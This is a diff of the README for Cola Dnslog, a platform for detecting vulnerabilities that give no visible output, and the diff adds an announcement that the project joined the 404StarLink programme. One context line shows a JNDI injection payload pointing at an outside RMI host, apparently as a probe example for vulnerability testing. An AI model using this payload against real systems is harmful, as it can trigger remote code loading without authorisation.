@@ -17,6 +17,7 @@ Cola Dnslog 是一款更加强大的dnslog平台（无回显漏洞探测辅助�
 - 支持钉钉机器人、Bark等提醒
 - 支持docker一键部署
 
+
 ------
 
 涉及到技术、框架：
@@ -423,6 +424,12 @@ ${jndi:rmi://1.1.1.1:1099/rmiqrq}
 ## 📜 声明
 
 本项目使用 Apache License 2.0
+
+
+## 404星链计划
+<img src lazysrc="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png">
+
+Cola Dnslog 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)
 
 
 ## 💦 其他
